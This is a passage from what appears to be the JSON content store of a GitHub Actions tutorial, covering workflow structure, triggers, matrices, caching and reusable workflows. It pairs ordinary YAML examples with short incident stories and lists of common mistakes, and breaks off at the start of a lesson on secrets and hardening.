class=\"hljs-attr\">test:\u003c/span>\n    \u003cspan class=\"hljs-attr\">needs:\u003c/span> \u003cspan class=\"hljs-string\">build\u003c/span>\n    \u003cspan class=\"hljs-attr\">runs-on:\u003c/span> \u003cspan class=\"hljs-string\">ubuntu-latest\u003c/span>\n    \u003cspan class=\"hljs-attr\">steps:\u003c/span>\n      \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">uses:\u003c/span> \u003cspan class=\"hljs-string\">actions/checkout@v4\u003c/span>\n      \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">run:\u003c/span> \u003cspan class=\"hljs-string\">echo\u003c/span> \u003cspan class=\"hljs-string\">&quot;testing $\u003cspan class=\"hljs-template-variable\">{{ needs.build.outputs.version }}\u003c/span>&quot;\u003c/span>\n      \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">run:\u003c/span> \u003cspan class=\"hljs-string\">make\u003c/span> \u003cspan class=\"hljs-string\">test\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>A \u003cstrong>workflow\u003c/strong> is one YAML file in \u003ccode>.github/workflows/\u003c/code>. Each \u003cstrong>job\u003c/strong> runs on its own fresh runner, so files from one job do not exist in another unless you upload and download an artifact. Jobs run in parallel unless \u003ccode>needs\u003c/code> creates an order. A \u003cstrong>step\u003c/strong> is either a shell command (\u003ccode>run\u003c/code>) or a reusable action (\u003ccode>uses\u003c/code>).\u003c/p>\n\u003ch2 id=\"passing-data\">Passing data\u003c/h2>\n\u003cp>Steps write \u003ccode>name=value\u003c/code> lines to the file named by \u003ccode>$GITHUB_OUTPUT\u003c/code>, and a job exposes them through \u003ccode>outputs\u003c/code>. Later jobs read them as \u003ccode>needs.&lt;job&gt;.outputs.&lt;name&gt;\u003c/code>. Keep outputs small. For files, use \u003ccode>actions/upload-artifact\u003c/code> and \u003ccode>actions/download-artifact\u003c/code>.\u003c/p>\n\u003ch2 id=\"reading-a-run\">Reading a run\u003c/h2>\n\u003cp>Each run lists jobs, steps and logs. A failing step turns the job red and skips later steps unless they use \u003ccode>if: always()\u003c/code>. Use \u003ccode>if: failure()\u003c/code> for cleanup that must run after errors. Enable debug logging by setting the repository secret \u003ccode>ACTIONS_STEP_DEBUG\u003c/code> to \u003ccode>true\u003c/code> when you need more detail.\u003c/p>\n\u003ch2 id=\"the-default-token\">The default token\u003c/h2>\n\u003cp>Every run gets a \u003ccode>GITHUB_TOKEN\u003c/code>. Set \u003ccode>permissions:\u003c/code> at the top to the minimum, usually \u003ccode>contents: read\u003c/code>, and raise it per job only where needed, for example \u003ccode>packages: write\u003c/code> to push an image. A default that is too broad turns a compromised step into write access to your repository.\u003c/p>\n\u003ch2 id=\"incident-the-job-that-could-not-find-its-build\">Incident: The job that could not find its build\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A test job failed because the build output did not exist there.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln out\">Run make test\u003c/span>\u003cspan class=\"ln out\">make: *** No rule to make target 'dist/app'. Stop.\u003c/span>\u003cspan class=\"ln out\">Error: Process completed with exit code 2.\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>The build job produced dist/app, but the test job started on a new runner where it did not exist. The author had assumed a shared disk. Uploading dist as an artifact in the build job and downloading it in the test job fixed it, and a comment now explains that jobs do not share files.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Assuming jobs share a filesystem\u003c/li>\n\u003cli>Leaving the default token permissions broad\u003c/li>\n\u003cli>Putting secrets directly in run lines instead of the env block\u003c/li>\n\u003cli>Forgetting that later steps skip after a failure\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"structure","text":"Structure"},{"id":"passing-data","text":"Passing data"},{"id":"reading-a-run","text":"Reading a run"},{"id":"the-default-token","text":"The default token"},{"id":"incident-the-job-that-could-not-find-its-build","text":"Incident: The job that could not find its build"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Workflow syntax for GitHub Actions","u":"https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions"},{"t":"Understanding GitHub Actions","u":"https://docs.github.com/en/actions/about-github-actions/understanding-github-actions"}],"text":"GitHub Actions runs automation from YAML files stored in your repository. The whole system comes down to three nesting levels, workflow, job and step, plus a small set of rules about how data and permissions pass between them. What you will learn The workflow, job and step structure How jobs run in parallel and depend on each other with needs Passing outputs and files between jobs Setting least-privilege GITHUB_TOKEN permissions Structure name: ci on: push: branches: [ main ] pull_request: permissions: contents: read jobs: build: runs-on: ubuntu-latest outputs: version: ${{ steps.ver.outputs.version }} steps: - uses: actions/checkout@v4 - id: ver run: echo \"version=1.4.$ {{ github.run_number }} \" >> \"$GITHUB_OUTPUT\" - run: make build test: needs: build runs-on: ubuntu-latest steps: - uses: actions/checkout@v4 - run: echo \"testing $ {{ needs.build.outputs.version }} \" - run: make test A workflow is one YAML file in .github/workflows/ . Each job runs on its own fresh runner, so files from one job do not exist in another unless you upload and download an artifact. Jobs run in parallel unless needs creates an order. A step is either a shell command ( run ) or a reusable action ( uses ). Passing data Steps write name=value lines to the file named by $GITHUB_OUTPUT , and a job exposes them through outputs . Later jobs read them as needs.\u003cjob>.outputs.\u003cname> . Keep outputs small. For files, use actions/upload-artifact and actions/download-artifact . Reading a run Each run lists jobs, steps and logs. A failing step turns the job red and skips later steps unless they use if: always() . Use if: failure() for cleanup that must run after errors. Enable debug logging by setting the repository secret ACTIONS_STEP_DEBUG to true when you need more detail. The default token Every run gets a GITHUB_TOKEN . Set permissions: at the top to the minimum, usually contents: read , and raise it per job only where needed, for example packages: write to push an image. A default that is too broad turns a compromised step into write access to your repository. Incident: The job that could not find its build Incident A test job failed because the build output did not exist there. Run make test make: *** No rule to make target 'dist/app'. Stop. Error: Process completed with exit code 2. The build job produced dist/app, but the test job started on a new runner where it did not exist. The author had assumed a shared disk. Uploading dist as an artifact in the build job and downloading it in the test job fixed it, and a comment now explains that jobs do not share files. Common mistakes Assuming jobs share a filesystem Leaving the default token permissions broad Putting secrets directly in run lines instead of the env block Forgetting that later steps skip after a failure"},"cicd/actions-triggers-matrices-and-caching":{"html":"\u003cp>A workflow that runs on everything is slow and expensive, and one that misses an important event is useless. This lesson covers triggers that match intent, matrices that test several versions and caches that stop rebuilding what has not changed.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>Common triggers and path and branch filters\u003c/li>\n\u003cli>Build matrices with include, exclude and fail-fast\u003c/li>\n\u003cli>Concurrency groups that cancel stale runs\u003c/li>\n\u003cli>Caching with keys and restore keys\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"triggers\">Triggers\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"on:\n  push:\n    branches: [main]\n    paths: ['src/**', 'package-lock.json']\n  pull_request:\n    types: [opened, synchronize, reopened]\n  schedule:\n    - cron: '17 3 * * 1'\n  workflow_dispatch:\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">on:\u003c/span>\n  \u003cspan class=\"hljs-attr\">push:\u003c/span>\n    \u003cspan class=\"hljs-attr\">branches:\u003c/span> [\u003cspan class=\"hljs-string\">main\u003c/span>]\n    \u003cspan class=\"hljs-attr\">paths:\u003c/span> [\u003cspan class=\"hljs-string\">&#x27;src/**&#x27;\u003c/span>, \u003cspan class=\"hljs-string\">&#x27;package-lock.json&#x27;\u003c/span>]\n  \u003cspan class=\"hljs-attr\">pull_request:\u003c/span>\n    \u003cspan class=\"hljs-attr\">types:\u003c/span> [\u003cspan class=\"hljs-string\">opened\u003c/span>, \u003cspan class=\"hljs-string\">synchronize\u003c/span>, \u003cspan class=\"hljs-string\">reopened\u003c/span>]\n  \u003cspan class=\"hljs-attr\">schedule:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">cron:\u003c/span> \u003cspan class=\"hljs-string\">&#x27;17 3 * * 1&#x27;\u003c/span>\n  \u003cspan class=\"hljs-attr\">workflow_dispatch:\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>\u003ccode>push\u003c/code> and \u003ccode>pull_request\u003c/code> are the everyday triggers. \u003ccode>paths\u003c/code> skips runs that cannot be affected. \u003ccode>schedule\u003c/code> uses UTC cron, and \u003ccode>workflow_dispatch\u003c/code> adds a manual button. Be careful with \u003ccode>pull_request_target\u003c/code>: it runs with write access and secrets in the context of the base branch, so never check out and run untrusted pull request code there.\u003c/p>\n\u003ch2 id=\"matrices\">Matrices\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"jobs:\n  test:\n    strategy:\n      fail-fast: false\n      matrix:\n        node: [18, 20, 22]\n        os: [ubuntu-latest, windows-latest]\n        exclude:\n          - os: windows-latest\n            node: 18\n    runs-on: ${{ matrix.os }}\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: ${{ matrix.node }}\n      - run: npm test\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">jobs:\u003c/span>\n  \u003cspan class=\"hljs-attr\">test:\u003c/span>\n    \u003cspan class=\"hljs-attr\">strategy:\u003c/span>\n      \u003cspan class=\"hljs-attr\">fail-fast:\u003c/span> \u003cspan class=\"hljs-literal\">false\u003c/span>\n      \u003cspan class=\"hljs-attr\">matrix:\u003c/span>\n        \u003cspan class=\"hljs-attr\">node:\u003c/span> [\u003cspan class=\"hljs-number\">18\u003c/span>, \u003cspan class=\"hljs-number\">20\u003c/span>, \u003cspan class=\"hljs-number\">22\u003c/span>]\n        \u003cspan class=\"hljs-attr\">os:\u003c/span> [\u003cspan class=\"hljs-string\">ubuntu-latest\u003c/span>, \u003cspan class=\"hljs-string\">windows-latest\u003c/span>]\n        \u003cspan class=\"hljs-attr\">exclude:\u003c/span>\n          \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">os:\u003c/span> \u003cspan class=\"hljs-string\">windows-latest\u003c/span>\n            \u003cspan class=\"hljs-attr\">node:\u003c/span> \u003cspan class=\"hljs-number\">18\u003c/span>\n    \u003cspan class=\"hljs-attr\">runs-on:\u003c/span> \u003cspan class=\"hljs-string\">${{\u003c/span> \u003cspan class=\"hljs-string\">matrix.os\u003c/span> \u003cspan class=\"hljs-string\">}}\u003c/span>\n    \u003cspan class=\"hljs-attr\">steps:\u003c/span>\n      \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">uses:\u003c/span> \u003cspan class=\"hljs-string\">actions/checkout@v4\u003c/span>\n      \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">uses:\u003c/span> \u003cspan class=\"hljs-string\">actions/setup-node@v4\u003c/span>\n        \u003cspan class=\"hljs-attr\">with:\u003c/span>\n          \u003cspan class=\"hljs-attr\">node-version:\u003c/span> \u003cspan class=\"hljs-string\">${{\u003c/span> \u003cspan class=\"hljs-string\">matrix.node\u003c/span> \u003cspan class=\"hljs-string\">}}\u003c/span>\n      \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">run:\u003c/span> \u003cspan class=\"hljs-string\">npm\u003c/span> \u003cspan class=\"hljs-string\">test\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>A matrix creates one job per combination. \u003ccode>fail-fast: false\u003c/code> lets the others finish so you see every failure. Use \u003ccode>exclude\u003c/code> to drop combinations and \u003ccode>include\u003c/code> to add special ones. Large matrices multiply cost, so test the edges of your support range, not every value.\u003c/p>\n\u003ch2 id=\"concurrency-and-caching\">Concurrency and caching\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"concurrency:\n  group: ci-${{ github.ref }}\n  cancel-in-progress: true\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">concurrency:\u003c/span>\n  \u003cspan class=\"hljs-attr\">group:\u003c/span> \u003cspan class=\"hljs-string\">ci-${{\u003c/span> \u003cspan class=\"hljs-string\">github.ref\u003c/span> \u003cspan class=\"hljs-string\">}}\u003c/span>\n  \u003cspan class=\"hljs-attr\">cancel-in-progress:\u003c/span> \u003cspan class=\"hljs-literal\">true\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>This cancels an older run when a newer commit lands on the same branch. Do not use it for deployments to production, where you want runs to queue instead.\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"- uses: actions/cache@v4\n  with:\n    path: ~/.npm\n    key: npm-${{ hashFiles('**/package-lock.json') }}\n    restore-keys: npm-\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">uses:\u003c/span> \u003cspan class=\"hljs-string\">actions/cache@v4\u003c/span>\n  \u003cspan class=\"hljs-attr\">with:\u003c/span>\n    \u003cspan class=\"hljs-attr\">path:\u003c/span> \u003cspan class=\"hljs-string\">~/.npm\u003c/span>\n    \u003cspan class=\"hljs-attr\">key:\u003c/span> \u003cspan class=\"hljs-string\">npm-${{\u003c/span> \u003cspan class=\"hljs-string\">hashFiles(&#x27;**/package-lock.json&#x27;)\u003c/span> \u003cspan class=\"hljs-string\">}}\u003c/span>\n    \u003cspan class=\"hljs-attr\">restore-keys:\u003c/span> \u003cspan class=\"hljs-string\">npm-\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>The \u003cstrong>key\u003c/strong> must change when dependencies change, so hash the lockfile. \u003ccode>restore-keys\u003c/code> allow a partial hit that still saves time. Caches are shared by branch scope and are not for secrets or build outputs you rely on being fresh.\u003c/p>\n\u003ch2 id=\"incident-two-deploys-at-once\">Incident: Two deploys at once\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>Two runs deployed to production at the same time and left a mixed release.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln out\">run 812: deploying build 41\u003c/span>\u003cspan class=\"ln out\">run 813: deploying build 42\u003c/span>\u003cspan class=\"ln out\">cancelled run 812 midway\u003c/span>\u003cspan class=\"ln out\">service reports versions 41 and 42\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Cancel-in-progress had been copied from the test workflow to the deploy workflow. A newer push cancelled a deployment halfway through and left the service half updated. The team separated the two: tests cancel stale runs, while deployments use a concurrency group that queues and never cancels.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Running every workflow on every push\u003c/li>\n\u003cli>Using pull_request_target to run untrusted code\u003c/li>\n\u003cli>Cache keys that never change, so stale dependencies persist\u003c/li>\n\u003cli>Cancelling in-progress deployments\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"triggers","text":"Triggers"},{"id":"matrices","text":"Matrices"},{"id":"concurrency-and-caching","text":"Concurrency and caching"},{"id":"incident-two-deploys-at-once","text":"Incident: Two deploys at once"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Events that trigger workflows","u":"https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows"},{"t":"Dependency caching","u":"https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/caching-dependencies-to-speed-up-workflows"}],"text":"A workflow that runs on everything is slow and expensive, and one that misses an important event is useless. This lesson covers triggers that match intent, matrices that test several versions and caches that stop rebuilding what has not changed. What you will learn Common triggers and path and branch filters Build matrices with include, exclude and fail-fast Concurrency groups that cancel stale runs Caching with keys and restore keys Triggers on: push: branches: [ main ] paths: [ &#x27;src/**&#x27; , &#x27;package-lock.json&#x27; ] pull_request: types: [ opened , synchronize , reopened ] schedule: - cron: &#x27;17 3 * * 1&#x27; workflow_dispatch: push and pull_request are the everyday triggers. paths skips runs that cannot be affected. schedule uses UTC cron, and workflow_dispatch adds a manual button. Be careful with pull_request_target : it runs with write access and secrets in the context of the base branch, so never check out and run untrusted pull request code there. Matrices jobs: test: strategy: fail-fast: false matrix: node: [ 18 , 20 , 22 ] os: [ ubuntu-latest , windows-latest ] exclude: - os: windows-latest node: 18 runs-on: ${{ matrix.os }} steps: - uses: actions/checkout@v4 - uses: actions/setup-node@v4 with: node-version: ${{ matrix.node }} - run: npm test A matrix creates one job per combination. fail-fast: false lets the others finish so you see every failure. Use exclude to drop combinations and include to add special ones. Large matrices multiply cost, so test the edges of your support range, not every value. Concurrency and caching concurrency: group: ci-${{ github.ref }} cancel-in-progress: true This cancels an older run when a newer commit lands on the same branch. Do not use it for deployments to production, where you want runs to queue instead. - uses: actions/cache@v4 with: path: ~/.npm key: npm-${{ hashFiles(&#x27;**/package-lock.json&#x27;) }} restore-keys: npm- The key must change when dependencies change, so hash the lockfile. restore-keys allow a partial hit that still saves time. Caches are shared by branch scope and are not for secrets or build outputs you rely on being fresh. Incident: Two deploys at once Incident Two runs deployed to production at the same time and left a mixed release. run 812: deploying build 41 run 813: deploying build 42 cancelled run 812 midway service reports versions 41 and 42 Cancel-in-progress had been copied from the test workflow to the deploy workflow. A newer push cancelled a deployment halfway through and left the service half updated. The team separated the two: tests cancel stale runs, while deployments use a concurrency group that queues and never cancels. Common mistakes Running every workflow on every push Using pull_request_target to run untrusted code Cache keys that never change, so stale dependencies persist Cancelling in-progress deployments"},"cicd/actions-reusable-workflows-and-composite-actions":{"html":"\u003cp>Copying a workflow into every repository works until the first change that must be made everywhere. Actions offers two sharing tools, and choosing the right one keeps pipelines small, consistent and easy to update.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>When to use a reusable workflow and when a composite action\u003c/li>\n\u003cli>Defining inputs, secrets and outputs\u003c/li>\n\u003cli>Calling a shared workflow safely\u003c/li>\n\u003cli>Versioning shared automation\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"reusable-workflows\">Reusable workflows\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"# .github/workflows/deploy.yml in the platform repository\non:\n  workflow_call:\n    inputs:\n      environment:\n        type: string\n        required: true\n    secrets:\n      deploy_key:\n        required: true\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    environment: ${{ inputs.environment }}\n    steps:\n      - uses: actions/checkout@v4\n      - run: ./deploy.sh\n        env:\n          DEPLOY_KEY: ${{ secrets.deploy_key }}\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-comment\"># .github/workflows/deploy.yml in the platform repository\u003c/span>\n\u003cspan class=\"hljs-attr\">on:\u003c/span>\n  \u003cspan class=\"hljs-attr\">workflow_call:\u003c/span>\n    \u003cspan class=\"hljs-attr\">inputs:\u003c/span>\n      \u003cspan class=\"hljs-attr\">environment:\u003c/span>\n        \u003cspan class=\"hljs-attr\">type:\u003c/span> \u003cspan class=\"hljs-string\">string\u003c/span>\n        \u003cspan class=\"hljs-attr\">required:\u003c/span> \u003cspan class=\"hljs-literal\">true\u003c/span>\n    \u003cspan class=\"hljs-attr\">secrets:\u003c/span>\n      \u003cspan class=\"hljs-attr\">deploy_key:\u003c/span>\n        \u003cspan class=\"hljs-attr\">required:\u003c/span> \u003cspan class=\"hljs-literal\">true\u003c/span>\n\u003cspan class=\"hljs-attr\">jobs:\u003c/span>\n  \u003cspan class=\"hljs-attr\">deploy:\u003c/span>\n    \u003cspan class=\"hljs-attr\">runs-on:\u003c/span> \u003cspan class=\"hljs-string\">ubuntu-latest\u003c/span>\n    \u003cspan class=\"hljs-attr\">environment:\u003c/span> \u003cspan class=\"hljs-string\">${{\u003c/span> \u003cspan class=\"hljs-string\">inputs.environment\u003c/span> \u003cspan class=\"hljs-string\">}}\u003c/span>\n    \u003cspan class=\"hljs-attr\">steps:\u003c/span>\n      \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">uses:\u003c/span> \u003cspan class=\"hljs-string\">actions/checkout@v4\u003c/span>\n      \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">run:\u003c/span> \u003cspan class=\"hljs-string\">./deploy.sh\u003c/span>\n        \u003cspan class=\"hljs-attr\">env:\u003c/span>\n          \u003cspan class=\"hljs-attr\">DEPLOY_KEY:\u003c/span> \u003cspan class=\"hljs-string\">${{\u003c/span> \u003cspan class=\"hljs-string\">secrets.deploy_key\u003c/span> \u003cspan class=\"hljs-string\">}}\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"# a service repository\njobs:\n  release:\n    uses: acme/platform/.github/workflows/deploy.yml@v2\n    with:\n      environment: staging\n    secrets:\n      deploy_key: ${{ secrets.STAGING_KEY }}\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-comment\"># a service repository\u003c/span>\n\u003cspan class=\"hljs-attr\">jobs:\u003c/span>\n  \u003cspan class=\"hljs-attr\">release:\u003c/span>\n    \u003cspan class=\"hljs-attr\">uses:\u003c/span> \u003cspan class=\"hljs-string\">acme/platform/.github/workflows/deploy.yml@v2\u003c/span>\n    \u003cspan class=\"hljs-attr\">with:\u003c/span>\n      \u003cspan class=\"hljs-attr\">environment:\u003c/span> \u003cspan class=\"hljs-string\">staging\u003c/span>\n    \u003cspan class=\"hljs-attr\">secrets:\u003c/span>\n      \u003cspan class=\"hljs-attr\">deploy_key:\u003c/span> \u003cspan class=\"hljs-string\">${{\u003c/span> \u003cspan class=\"hljs-string\">secrets.STAGING_KEY\u003c/span> \u003cspan class=\"hljs-string\">}}\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>A reusable workflow is a whole job set triggered by \u003ccode>workflow_call\u003c/code>. The caller uses it at the job level, passes inputs and passes secrets explicitly. It runs as its own jobs, so it can have its own runners, environments and permissions.\u003c/p>\n\u003ch2 id=\"composite-actions\">Composite actions\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"# .github/actions/setup-tools/action.yml\nname: setup-tools\ndescription: Install the standard toolchain\ninputs:\n  version:\n    description: Tool version\n    default: '1.8'\nruns:\n  using: composite\n  steps:\n    - run: ./install-tools.sh ${{ inputs.version }}\n      shell: bash\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-comment\"># .github/actions/setup-tools/action.yml\u003c/span>\n\u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">setup-tools\u003c/span>\n\u003cspan class=\"hljs-attr\">description:\u003c/span> \u003cspan class=\"hljs-string\">Install\u003c/span> \u003cspan class=\"hljs-string\">the\u003c/span> \u003cspan class=\"hljs-string\">standard\u003c/span> \u003cspan class=\"hljs-string\">toolchain\u003c/span>\n\u003cspan class=\"hljs-attr\">inputs:\u003c/span>\n  \u003cspan class=\"hljs-attr\">version:\u003c/span>\n    \u003cspan class=\"hljs-attr\">description:\u003c/span> \u003cspan class=\"hljs-string\">Tool\u003c/span> \u003cspan class=\"hljs-string\">version\u003c/span>\n    \u003cspan class=\"hljs-attr\">default:\u003c/span> \u003cspan class=\"hljs-string\">&#x27;1.8&#x27;\u003c/span>\n\u003cspan class=\"hljs-attr\">runs:\u003c/span>\n  \u003cspan class=\"hljs-attr\">using:\u003c/span> \u003cspan class=\"hljs-string\">composite\u003c/span>\n  \u003cspan class=\"hljs-attr\">steps:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">run:\u003c/span> \u003cspan class=\"hljs-string\">./install-tools.sh\u003c/span> \u003cspan class=\"hljs-string\">${{\u003c/span> \u003cspan class=\"hljs-string\">inputs.version\u003c/span> \u003cspan class=\"hljs-string\">}}\u003c/span>\n      \u003cspan class=\"hljs-attr\">shell:\u003c/span> \u003cspan class=\"hljs-string\">bash\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>A composite action packages several \u003cstrong>steps\u003c/strong> that you call inside any job with \u003ccode>uses\u003c/code>. It is best for small repeated sequences such as setup. It does not create jobs, runners or environments.\u003c/p>\n\u003ch2 id=\"choosing-and-versioning\">Choosing and versioning\u003c/h2>\n\u003cp>Use a reusable workflow to standardize a whole pipeline stage, such as build and deploy. Use a composite action for a few steps inside a job. Callers should pin to a release tag, or a full commit SHA when the source is outside your control, never to a moving branch. Publish changelogs and keep old major versions working for a while, so one change does not break forty pipelines at once.\u003c/p>\n\u003ch2 id=\"incident-the-shared-workflow-that-changed-overnight\">Incident: The shared workflow that changed overnight\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A moving branch reference let a shared change break every service.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln out\">run: uses acme/platform/.github/workflows/build.yml@main\u003c/span>\u003cspan class=\"ln out\">error: input 'cache-key' is required\u003c/span>\u003cspan class=\"ln out\">38 workflows failed\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Callers referenced the shared workflow at main. A well-meaning change added a required input, and every service pipeline failed at once. The platform team moved callers to version tags, released the change as a new major version with notes and let teams upgrade on their own schedule.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Calling shared workflows at a moving branch\u003c/li>\n\u003cli>Passing every secret with inherit when two are needed\u003c/li>\n\u003cli>Using a composite action where separate jobs are needed\u003c/li>\n\u003cli>Shipping shared pipeline changes without a changelog\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"reusable-workflows","text":"Reusable workflows"},{"id":"composite-actions","text":"Composite actions"},{"id":"choosing-and-versioning","text":"Choosing and versioning"},{"id":"incident-the-shared-workflow-that-changed-overnight","text":"Incident: The shared workflow that changed overnight"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Reusing workflows","u":"https://docs.github.com/en/actions/sharing-automations/reusing-workflows"},{"t":"Creating a composite action","u":"https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-composite-action"}],"text":"Copying a workflow into every repository works until the first change that must be made everywhere. Actions offers two sharing tools, and choosing the right one keeps pipelines small, consistent and easy to update. What you will learn When to use a reusable workflow and when a composite action Defining inputs, secrets and outputs Calling a shared workflow safely Versioning shared automation Reusable workflows # .github/workflows/deploy.yml in the platform repository on: workflow_call: inputs: environment: type: string required: true secrets: deploy_key: required: true jobs: deploy: runs-on: ubuntu-latest environment: ${{ inputs.environment }} steps: - uses: actions/checkout@v4 - run: ./deploy.sh env: DEPLOY_KEY: ${{ secrets.deploy_key }} # a service repository jobs: release: uses: acme/platform/.github/workflows/deploy.yml@v2 with: environment: staging secrets: deploy_key: ${{ secrets.STAGING_KEY }} A reusable workflow is a whole job set triggered by workflow_call . The caller uses it at the job level, passes inputs and passes secrets explicitly. It runs as its own jobs, so it can have its own runners, environments and permissions. Composite actions # .github/actions/setup-tools/action.yml name: setup-tools description: Install the standard toolchain inputs: version: description: Tool version default: &#x27;1.8&#x27; runs: using: composite steps: - run: ./install-tools.sh ${{ inputs.version }} shell: bash A composite action packages several steps that you call inside any job with uses . It is best for small repeated sequences such as setup. It does not create jobs, runners or environments. Choosing and versioning Use a reusable workflow to standardize a whole pipeline stage, such as build and deploy. Use a composite action for a few steps inside a job. Callers should pin to a release tag, or a full commit SHA when the source is outside your control, never to a moving branch. Publish changelogs and keep old major versions working for a while, so one change does not break forty pipelines at once. Incident: The shared workflow that changed overnight Incident A moving branch reference let a shared change break every service. run: uses acme/platform/.github/workflows/build.yml@main error: input 'cache-key' is required 38 workflows failed Callers referenced the shared workflow at main. A well-meaning change added a required input, and every service pipeline failed at once. The platform team moved callers to version tags, released the change as a new major version with notes and let teams upgrade on their own schedule. Common mistakes Calling shared workflows at a moving branch Passing every secret with inherit when two are needed Using a composite action where separate jobs are needed Shipping shared pipeline changes without a changelog"},"cicd/actions-secrets-oidc-and-hardening":{"html":"\u003cp>A workflow is code that runs with credentials, so it deserves the same care as production access. The main risks are leaked secrets, malicious third-party actions and untrusted input reaching a shell, and each has a clear defense.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>Storing secrets at the right scope and keeping them out of logs\u003c/li>\n\u003cli>Using OIDC instead of long-lived 